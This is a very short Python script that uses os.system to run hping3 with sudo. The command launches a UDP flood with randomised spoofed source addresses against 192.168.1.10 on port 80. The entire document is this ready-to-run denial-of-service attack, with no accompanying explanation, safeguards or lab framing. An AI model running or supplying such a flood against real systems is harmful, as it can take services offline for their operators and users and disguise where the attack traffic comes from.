#!/usr/bin/python

import os

cmd = 'sudo hping3 --flood --rand-source --udp 192.168.1.10 -p 80'
os.system(cmd)

